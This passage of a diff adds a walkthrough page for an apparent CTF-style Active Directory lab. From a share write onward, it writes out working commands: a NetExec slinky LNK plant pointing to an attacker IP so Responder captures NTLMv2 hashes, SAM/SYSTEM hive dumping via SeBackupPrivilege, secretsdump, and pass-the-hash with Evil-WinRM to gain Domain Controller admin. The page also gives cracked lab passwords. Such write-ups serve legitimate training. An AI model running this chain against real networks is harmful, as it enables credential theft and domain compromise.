+</code></pre></div>
+<blockquote>
+<p><strong>Result:</strong> Password changed successfully. <code>h.potch : NewPass!@</code></p>
+</blockquote>
+<p>SMB validation confirmed the new credentials, and <code>h.potch</code> has <strong>READ,WRITE</strong> access to <code>File-Share</code>.</p>
+<hr />
+<h2 id="7-capturing-hgrangon-llmnr-poisoning-via-slinky">7. Capturing <code>h.grangon</code> — LLMNR Poisoning via Slinky</h2>
+<p>With write access to <code>File-Share</code>, the <code>slinky</code> NetExec module was used to plant a malicious <code>.lnk</code> (Windows shortcut) file. When any domain user browses the share, their machine automatically attempts SMB authentication to the attacker-controlled server, leaking their NTLMv2 hash.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>buildingmagic.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;h.potch&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;NewPass!@&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span>-M<span class="w"> </span>slinky<span class="w"> </span>-o<span class="w"> </span><span class="nv">SERVER</span><span class="o">=</span><span class="m">10</span>.200.55.240<span class="w"> </span><span class="nv">SHARES</span><span class="o">=</span>File-Share<span class="w"> </span><span class="nv">NAME</span><span class="o">=</span>rodkast
+</code></pre></div>
+<p>The LNK file was successfully created on <code>File-Share</code>. Responder, listening on <code>10.200.55.240</code>, captured the NTLMv2 hash for <code>h.grangon</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>h.grangon::BUILDINGMAGIC:2e892b8635e20f7f:B74280E1743FF770...
+</code></pre></div>
+<p>The hash was cracked offline:</p>
+<blockquote>
+<p><strong>Cracked:</strong> <code>h.grangon : magic4ever</code></p>
+</blockquote>
+<p>Validation confirmed <code>h.grangon</code> has <strong>READ,WRITE</strong> access to <code>File-Share</code>.</p>
+<hr />
+<h2 id="8-post-exploitation-abusing-sebackupprivilege">8. Post-Exploitation — Abusing SeBackupPrivilege</h2>
+<p>A WinRM session was opened with <code>h.grangon</code> using Evil-WinRM:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>dc01.buildingmagic.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;h.grangon&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;magic4ever&#39;</span>
+</code></pre></div>
+<p>Running <code>whoami /priv</code> revealed a critical privilege:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Privilege Name                Description                    State
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>============================= ============================== =======
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>SeMachineAccountPrivilege     Add workstations to domain     Enabled
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>SeBackupPrivilege             Back up files and directories  Enabled
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div>
+<blockquote>
+<p><strong>Warning:</strong> <code>SeBackupPrivilege</code> allows reading <strong>any</strong> file on the system regardless of ACLs — including the SAM and SYSTEM registry hives which store local password hashes.</p>
+</blockquote>
+<h3 id="dumping-the-sam-and-system-hives">Dumping the SAM and SYSTEM Hives</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span>    <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">h</span><span class="p">.</span><span class="n">grangon</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">sam</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">h</span><span class="p">.</span><span class="n">grangon</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">system</span>
+</code></pre></div>
+<p>Both files were downloaded to the attacker machine and parsed with Impacket <code>secretsdump</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>secretsdump.py<span class="w"> </span>-sam<span class="w"> </span>sam<span class="w"> </span>-system<span class="w"> </span>system<span class="w"> </span><span class="nb">local</span>
+</code></pre></div>
+<p><strong>Hashes recovered:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</code></pre></div>
+<hr />
+<h2 id="9-domain-compromise-pass-the-hash-as-aflatch">9. Domain Compromise — Pass-the-Hash as <code>a.flatch</code></h2>
+<p>Listing users on the DC revealed <code>a.flatch</code> in the <strong>Administrators</strong> group:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">net</span> <span class="n">users</span>
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="c"># a.flatch   Administrator   Guest</span>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c"># h.grangon  h.potch         krbtgt</span>
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="c"># r.haggard  r.widdleton</span>
+</code></pre></div>
+<p>The recovered Administrator NT hash matched <code>a.flatch</code> due to password reuse. A Pass-the-Hash attack was performed directly:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>evil-winrm<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;a.flatch&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;520126a03f5d5a8d836f1c4f34ede7ce&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="w">  </span>-i<span class="w"> </span>dc01.buildingmagic.local
+</code></pre></div>
+<blockquote>
+<p><strong>Result:</strong> Shell obtained as <code>a.flatch</code> — local Administrator on the Domain Controller.</p>
+</blockquote>
+<hr />
+<h2 id="10-root-flag">10. Root Flag</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="nb">cat </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>&lt;Root-FLAG&gt;
+</code></pre></div>
+<hr />
+<h2 id="attack-chain-summary">Attack Chain Summary</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>Leaked DB (MD5 hashes)
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>         |
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>         v
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>r.widdleton:lilronron  --&gt;  SMB Enumeration + BloodHound Collection
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>         |
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>         v
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>Kerberoasting r.haggard  --&gt;  Hash cracked: rubeushagrid
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>         |
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>         v
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a>ForceChangePassword on h.potch  --&gt;  NewPass!@  (Write access to File-Share)
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>         |
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>         v
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>Slinky LNK in File-Share  --&gt;  Responder captures h.grangon NTLMv2 hash
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a>         |
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>         v
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>h.grangon:magic4ever  --&gt;  Evil-WinRM shell
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>         |
+<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>         v
+<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>SeBackupPrivilege  --&gt;  SAM + SYSTEM dump  --&gt;  secretsdump  --&gt;  Admin NT hash
+<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a>         |
+<a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>         v
+<a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>Pass-the-Hash as a.flatch  --&gt;  Administrator shell  --&gt;  root.txt [DONE]
+</code></pre></div>
+<hr />
+<h2 id="tools-used">Tools Used</h2>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="https://github.com/Pennyw0rth/NetExec">NetExec (nxc)</a></td>
+<td>SMB/LDAP enumeration, Kerberoasting, Slinky module</td>
+</tr>
+<tr>
+<td><a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a></td>
+<td>AD graph analysis and attack path discovery</td>
+</tr>
+<tr>
+<td><a href="https://hashcat.net/hashcat/">Hashcat</a></td>
+<td>Offline hash cracking (MD5, Kerberos TGS)</td>
+</tr>
+<tr>
+<td><a href="https://github.com/lgandx/Responder">Responder</a></td>
+<td>NTLMv2 hash capture via LLMNR/NBT-NS poisoning</td>
+</tr>
+<tr>
+<td><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a></td>
+<td>Remote shell via WinRM</td>
+</tr>
+<tr>
+<td><a href="https://github.com/fortra/impacket">Impacket secretsdump</a></td>
+<td>SAM/SYSTEM hive parsing and hash extraction</td>
+</tr>
+<tr>
+<td>net rpc (Samba)</td>
+<td>Forced password change via RPC</td>
+</tr>
+</tbody>
+</table>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.top", "search.highlight", "search.suggest", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
